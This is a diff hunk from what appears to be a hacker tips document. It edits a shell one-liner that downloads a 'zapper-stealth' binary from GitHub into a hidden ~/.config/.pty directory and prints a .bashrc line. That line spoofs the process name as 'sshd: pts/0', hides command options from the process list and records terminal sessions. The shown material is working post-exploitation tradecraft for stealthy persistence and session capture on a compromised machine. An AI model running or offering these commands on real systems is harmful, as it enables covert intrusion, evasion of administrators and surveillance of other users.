@@ -1898,7 +1898,7 @@ command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
 && curl -o ~/.config/.pty/ini -fsSL "https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-stealth-linux-$(uname -m)" \
 && chmod 755 ~/.config/.pty/ini ~/.config/.pty/pty \
 && echo -e '----------\n\e[0;32mSUCCESS\e[0m. Add the following line to \e[0;36m~/.bashrc\e[0m:\e[0;35m' \
-&& echo -e '[ -z "$LC_PTY" ] && [ -t0 ] && [[ "$HISTFILE" != *null* ]] && [ -x ~/.config/.pty/ini ] && [ -x ~/.config/.pty/pty ] && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty -qaec "exec -a -bash '"$(command -v bash)"'" -I ~/.config/.pty/.@pty-unix.$$\e[0m'
+&& echo -e '[ -z "$LC_PTY" ] && [ -t0 ] && [[ "$HISTFILE" != *null* ]] && [ -x ~/.config/.pty/ini ] && [ -x ~/.config/.pty/pty ] && LC_PTY=1 exec ~/.config/.pty/ini -a "sshd: pts/0" ~/.config/.pty/pty -fqaec "exec -a -bash '"$(command -v bash)"'" -I ~/.config/.pty/.@pty-unix.$$\e[0m'
 ```
 
 - Combined with zapper to hide command options from the process list.
